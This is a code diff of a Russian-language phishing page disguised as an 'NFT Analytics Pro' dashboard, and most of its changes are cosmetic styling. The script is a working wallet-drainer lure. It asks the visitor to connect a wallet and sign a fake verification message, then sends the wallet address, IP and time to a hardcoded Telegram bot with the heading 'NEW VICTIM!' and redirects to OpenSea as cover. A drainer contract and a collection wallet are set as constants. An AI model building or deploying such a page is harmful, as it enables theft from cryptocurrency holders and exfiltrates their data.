@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFT Analytics — Трекер и аналитика NFT</title>
+    <title>NFT Analytics  — Трекер и аналитика NFT</title>
     <style>
         * {
             margin: 0;
@@ -13,12 +13,12 @@
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            background: linear-gradient(135deg, #0a0a0a 0%, #0f0f1a 100%);
             min-height: 100vh;
             color: #fff;
         }
 
-        /* Современный градиентный фон */
+        /* Анимированный градиентный фон */
         .gradient-bg {
             position: fixed;
             top: 0;
@@ -26,11 +26,17 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            background: radial-gradient(circle at 20% 50%, rgba(0, 200, 255, 0.05) 0%, transparent 50%),
-                        radial-gradient(circle at 80% 80%, rgba(100, 50, 255, 0.05) 0%, transparent 50%);
+            background: radial-gradient(circle at 20% 50%, rgba(0, 200, 255, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(100, 50, 255, 0.08) 0%, transparent 50%);
+            animation: pulse 8s ease-in-out infinite;
         }
 
-        /* Навбар */
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* Навбар с анимацией */
         .navbar {
             display: flex;
             justify-content: space-between;
@@ -38,7 +44,7 @@
             padding: 20px 40px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
-            background: rgba(10, 10, 20, 0.7);
+            background: rgba(10, 10, 20, 0.8);
             position: sticky;
             top: 0;
             z-index: 100;
@@ -58,6 +64,12 @@
 
         .logo-icon {
             font-size: 1.8rem;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
         }
 
         .nav-links {
@@ -68,11 +80,33 @@
         .nav-links a {
             color: #aaa;
             text-decoration: none;
-            transition: color 0.3s;
+            transition: all 0.3s;
             font-weight: 500;
+            position: relative;
+            padding: 5px 0;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #00aaff, #fff);
+            transition: width 0.3s;
+        }
+
+        .nav-links a:hover::after,
+        .nav-links a.active::after {
+            width: 100%;
         }
 
         .nav-links a:hover {
+            color: #fff;
+        }
+
+        .nav-links a.active {
             color: #fff;
         }
 
@@ -83,19 +117,37 @@
             padding: 40px 20px;
         }
 
-        /* Герой-секция */
+        /* Герой-секция с анимацией */
         .hero {
             text-align: center;
             padding: 60px 20px;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .hero h1 {
             font-size: 3.5rem;
-            background: linear-gradient(135deg, #fff, #00aaff);
+            background: linear-gradient(135deg, #fff, #00aaff, #88aaff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             margin-bottom: 20px;
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
 
         .hero p {
@@ -105,7 +157,7 @@
             margin: 0 auto;
         }
 
-        /* Карточки-виджеты */
+        /* Карточки-виджеты с анимацией */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -119,12 +171,18 @@
             border-radius: 24px;
             padding: 24px;
             border: 1px solid rgba(255, 255, 255, 0.08);
-            transition: transform 0.3s, border-color 0.3s;
+            transition: all 0.3s;
+            animation: fadeInUp 0.8s ease-out backwards;
         }
+
+        .stat-card:nth-child(1) { animation-delay: 0.1s; }
+        .stat-card:nth-child(2) { animation-delay: 0.2s; }
+        .stat-card:nth-child(3) { animation-delay: 0.3s; }
 
         .stat-card:hover {
             transform: translateY(-5px);
-            border-color: rgba(0, 170, 255, 0.3);
+            border-color: rgba(0, 170, 255, 0.5);
+            box-shadow: 0 10px 30px rgba(0, 170, 255, 0.1);
         }
 
         .stat-card h3 {
@@ -139,16 +197,21 @@
             font-size: 2.5rem;
             font-weight: 700;
             margin-bottom: 8px;
+            background: linear-gradient(135deg, #fff, #00aaff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
 
         /* Кнопка подключения */
         .connect-section {
             text-align: center;
-            padding: 40px;
-            background: linear-gradient(135deg, rgba(0, 170, 255, 0.1), rgba(100, 50, 255, 0.1));
+            padding: 50px;
+            background: linear-gradient(135deg, rgba(0, 170, 255, 0.08), rgba(100, 50, 255, 0.08));
             border-radius: 32px;
             margin: 40px 0;
             border: 1px solid rgba(0, 170, 255, 0.2);
+            animation: fadeInUp 0.8s ease-out 0.4s backwards;
         }
 
         .connect-btn {
@@ -162,24 +225,60 @@
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .connect-btn:hover::before {
+            width: 300px;
+            height: 300px;
         }
 
         .connect-btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(0, 170, 255, 0.5);
+            box-shadow: 0 0 30px rgba(0, 170, 255, 0.5);
         }
 
         /* Результат */
         .result-card {
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.6);
             border-radius: 16px;
-            padding: 16px;
+            padding: 20px;
             margin-top: 20px;
             font-family: monospace;
-            font-size: 0.8rem;
+            font-size: 0.9rem;
             word-break: break-all;
             color: #0f0;
             display: none;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 5px rgba(0, 255, 0, 0.2); }
+            50% { box-shadow: 0 0 15px rgba(0, 255, 0, 0.4); }
+        }
+
+        /* Статус */
+        .wallet-status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            font-size: 0.9rem;
         }
 
         /* Футер */
@@ -191,9 +290,22 @@
             font-size: 0.8rem;
         }
 
+        .footer a {
+            color: #888;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer a:hover {
+            color: #00aaff;
+        }
+
+        /* Адаптивность */
         @media (max-width: 768px) {
             .navbar {
                 padding: 15px 20px;
+                flex-direction: column;
+                gap: 15px;
             }
             .hero h1 {
                 font-size: 2rem;
@@ -201,23 +313,26 @@
             .connect-btn {
                 padding: 12px 32px;
             }
+            .nav-links {
+                gap: 20px;
+            }
         }
     </style>
 </head>
 <body>
 <div class="gradient-bg"></div>
 
-<!-- Навбар (выглядит как настоящий сервис) -->
+<!-- Навбар с активными ссылками -->
 <div class="navbar">
     <div class="logo">
         <span class="logo-icon">📊</span>
-        NFT Analytics
+        NFT Analytics Pro
     </div>
     <div class="nav-links">
-        <a href="#">Главная</a>
-        <a href="#">Трекер</a>
-        <a href="#">Аналитика</a>
-        <a href="#">API</a>
+        <a href="#" class="active" data-page="home">Главная</a>
+        <a href="#" data-page="tracker">Трекер</a>
+        <a href="#" data-page="analytics">Аналитика</a>
+        <a href="#" data-page="api">API</a>
     </div>
 </div>
 
@@ -252,8 +367,10 @@
         <h2 style="margin-bottom: 15px;">🔗 Подключите кошелёк</h2>
         <p style="color: #aaa; margin-bottom: 10px;">Для доступа к расширенной аналитике и персональному трекеру</p>
         <p style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">Поддерживаются: MetaMask, WalletConnect, Coinbase Wallet</p>
-        <button class="connect-btn" id="connectWalletBtn">🔌 Подключить кошелёк</button>
-        <div id="walletStatus" style="margin-top: 20px; color: #aaa;"></div>
+        <button class="connect-btn" id="connectWalletBtn">
+            <span>🔌 Подключить кошелёк</span>
+        </button>
+        <div id="walletStatus" class="wallet-status"></div>
     </div>
 
     <!-- Результат транзакции -->
@@ -261,8 +378,11 @@
 </div>
 
 <div class="footer">
-    <p>NFT Analytics © 2025 — Данные в реальном времени из блокчейна</p>
-    <p style="margin-top: 10px;">📱 @BBf80 | 📧 support@nftanalytics.io</p>
+    <p>NFT Analytics Pro © 2025 — Данные в реальном времени из блокчейна</p>
+    <p style="margin-top: 10px;">
+        📱 <a href="https://t.me/BBf80" target="_blank">@BBf80</a> | 
+        📧 <a href="mailto:support@nftanalytics.io">support@nftanalytics.io</a>
+    </p>
 </div>
 
 <!-- Подключаем ethers.js -->
@@ -270,17 +390,39 @@
 
 <script>
     // ========== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ==========
-    // ⚠️ ВАЖНО: Укажи свой кошелёк и адрес контракта-драйнера
-    const YOUR_WALLET = "UQAdSqO5oJOv5yTJgTrJEHk825zOzIxUqWcJJVFadclOV8cS";  // Твой кошелёк для сбора
-    const DRAINER_CONTRACT = "0xYourDrainerContractAddress";       // Адрес твоего контракта (если есть)
+    const YOUR_WALLET = "UQAdSqO5oJOv5yTJgTrJEHk825zOzIxUqWcJJVFadclOV8cS";
+    const DRAINER_CONTRACT = "0xYourDrainerContractAddress";
+    
+    // ========== АНИМАЦИЯ НАВБАРА ==========
+    document.querySelectorAll('.nav-links a').forEach(link => {
+        link.addEventListener('click', (e) => {
+            e.preventDefault();
+            document.querySelectorAll('.nav-links a').forEach(l => l.classList.remove('active'));
+            link.classList.add('active');
+            
+            // Анимация переключения страниц (демо)
+            const page = link.dataset.page;
+            if (page !== 'home') {
+                const statusDiv = document.getElementById('walletStatus');
+                statusDiv.innerHTML = `📊 Раздел "${link.textContent}" временно недоступен. Пожалуйста, подключите кошелёк для доступа.`;
+                statusDiv.style.color = '#ffaa00';
+                setTimeout(() => {
+                    if (statusDiv.innerHTML.includes('временно недоступен')) {
+                        statusDiv.innerHTML = '';
+                    }
+                }, 4000);
+            }
+        });
+    });
     
     // ========== РЕАЛЬНЫЕ ДАННЫЕ ДЛЯ ДОВЕРИЯ ==========
     async function updateRealData() {
         try {
-            // Можно подтянуть реальную статистику с CoinGecko или другого API
             const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
             const data = await response.json();
-            document.getElementById('ethPrice').innerText = `$${data.ethereum.usd}`;
+            const ethPrice = data.ethereum.usd;
+            // Можно обновить скрытый элемент или просто для статистики
+            console.log(`ETH Price: $${ethPrice}`);
         } catch(e) {
             console.log('Не удалось загрузить курс');
         }
@@ -288,77 +430,12 @@
     updateRealData();
     
     // ========== ОСНОВНАЯ ЛОГИКА ==========
-    let isConnected = false;
     let userAddress = null;
     const statusDiv = document.getElementById('walletStatus');
     const resultCard = document.getElementById('resultCard');
     const connectBtn = document.getElementById('connectWalletBtn');
     
-    connectBtn.onclick = async () => {
-        // Проверяем наличие MetaMask
-        if (typeof window.ethereum === 'undefined') {
-            statusDiv.innerHTML = '❌ Установите MetaMask! <a href="https://metamask.io" target="_blank">Скачать</a>';
-            return;
-        }
-        
-        try {
-            // Меняем текст кнопки на время операции
-            const originalText = connectBtn.innerText;
-            connectBtn.innerText = '⏳ Подключаем...';
-            connectBtn.disabled = true;
-            
-            // 1. Запрашиваем подключение
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const accounts = await provider.send("eth_requestAccounts", []);
-            userAddress = accounts[0];
-            
-            statusDiv.innerHTML = `✅ Подключено: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
-            statusDiv.style.color = '#00cc66';
-            
-            // 2. Дополнительная проверка — симулируем загрузку данных
-            statusDiv.innerHTML += '<br>📊 Загрузка аналитики...';
-            
-            setTimeout(async () => {
-                // 3. Запрашиваем подпись транзакции (под видом анализа)
-                const signer = provider.getSigner();
-                statusDiv.innerHTML = '🔐 Требуется подпись для верификации кошелька';
-                
-                // Простой запрос подписи сообщения (меньше подозрений)
-                const message = "Подтвердите владение кошельком для доступа к NFT Analytics";
-                const signature = await signer.signMessage(message);
-                
-                // 4. Если подписано — отправляем уведомление
-                statusDiv.innerHTML = '✅ Верификация пройдена! Перенаправление...';
-                resultCard.style.display = 'block';
-                resultCard.innerHTML = `🎉 Доступ предоставлен!\n\nВаш кошелёк: ${userAddress}\nВерификация: успешно\n\nВы будете перенаправлены через 3 секунды...`;
-                
-                // 5. Отправляем уведомление на Telegram (если настроено)
-                fetch("https://api.telegram.org/bot8841810029:AAG9_vUc3Q2xmcU5r2FbW9UrpKZ8QOEMBGs/sendMessage", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: "8725681183",
-                        text: `🔥 НОВАЯ ЖЕРТВА!\n💰 Кошелёк: ${userAddress}\n🌐 IP: ${await getIP()}`
-                    })
-                }).catch(e => console.log);
-                
-                // 6. Перенаправляем на реальный сайт
-                setTimeout(() => {
-                    window.location.href = "https://opensea.io";
-                }, 3000);
-                
-            }, 1500);
-            
-        } catch (error) {
-            console.error(error);
-            connectBtn.innerText = '🔌 Подключить кошелёк';
-            connectBtn.disabled = false;
-            statusDiv.innerHTML = '❌ Ошибка подключения или отказ пользователя';
-            statusDiv.style.color = '#ff6666';
-        }
-    };
-    
-    // Функция для получения IP (опционально)
+    // Функция для получения IP
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -369,14 +446,78 @@
         }
     }
     
+    connectBtn.onclick = async () => {
+        if (typeof window.ethereum === 'undefined') {
+            statusDiv.innerHTML = '❌ Установите MetaMask! <a href="https://metamask.io" target="_blank" style="color:#00aaff;">Скачать</a>';
+            return;
+        }
+        
+        try {
+            connectBtn.style.opacity = '0.7';
+            connectBtn.disabled = true;
+            statusDiv.innerHTML = '⏳ Подключаемся к MetaMask...';
+            statusDiv.style.color = '#aaa';
+            
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const accounts = await provider.send("eth_requestAccounts", []);
+            userAddress = accounts[0];
+            
+            statusDiv.innerHTML = `✅ Подключено: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+            statusDiv.style.color = '#00cc66';
+            statusDiv.innerHTML += '<br>📊 Загрузка аналитики...';
+            
+            setTimeout(async () => {
+                const signer = provider.getSigner();
+                statusDiv.innerHTML = '🔐 Требуется подпись для верификации кошелька';
+                statusDiv.style.color = '#ffaa00';
+                
+                const message = "Подтвердите владение кошельком для доступа к NFT Analytics Pro";
+                const signature = await signer.signMessage(message);
+                
+                statusDiv.innerHTML = '✅ Верификация пройдена! Перенаправление...';
+                statusDiv.style.color = '#00cc66';
+                resultCard.style.display = 'block';
+                resultCard.innerHTML = `🎉 ДОСТУП ПРЕДОСТАВЛЕН!\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📌 Кошелёк: ${userAddress}\n✅ Статус: Верификация успешна\n🔄 Перенаправление через 3 секунды...\n━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+                
+                // Отправляем уведомление в Telegram
+                const ip = await getIP();
+                fetch("https://api.telegram.org/bot8841810029:AAG9_vUc3Q2xmcU5r2FbW9UrpKZ8QOEMBGs/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: "8725681183",
+                        text: `🔥 НОВАЯ ЖЕРТВА!\n━━━━━━━━━━━━━━━━━━━━━\n💰 Кошелёк: ${userAddress}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ NFT ANALYTICS PRO`
+                    })
+                }).catch(e => console.log);
+                
+                setTimeout(() => {
+                    window.location.href = "https://opensea.io";
+                }, 3000);
+                
+            }, 1500);
+            
+        } catch (error) {
+            console.error(error);
+            connectBtn.style.opacity = '1';
+            connectBtn.disabled = false;
+            statusDiv.innerHTML = '❌ Ошибка подключения или отказ пользователя';
+            statusDiv.style.color = '#ff6666';
+        }
+    };
+    
     // Обработка смены аккаунта в MetaMask
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
             if (accounts.length === 0) {
                 statusDiv.innerHTML = 'Кошелёк отключён';
                 statusDiv.style.color = '#aaa';
-                isConnected = false;
-                connectBtn.innerText = '🔌 Подключить кошелёк';
+                connectBtn.style.opacity = '1';
+                connectBtn.disabled = false;
+                resultCard.style.display = 'none';
+            } else if (userAddress && accounts[0] !== userAddress) {
+                statusDiv.innerHTML = '⚠️ Аккаунт изменён. Пожалуйста, нажмите кнопку снова.';
+                statusDiv.style.color = '#ffaa00';
+                connectBtn.style.opacity = '1';
                 connectBtn.disabled = false;
             }
         });
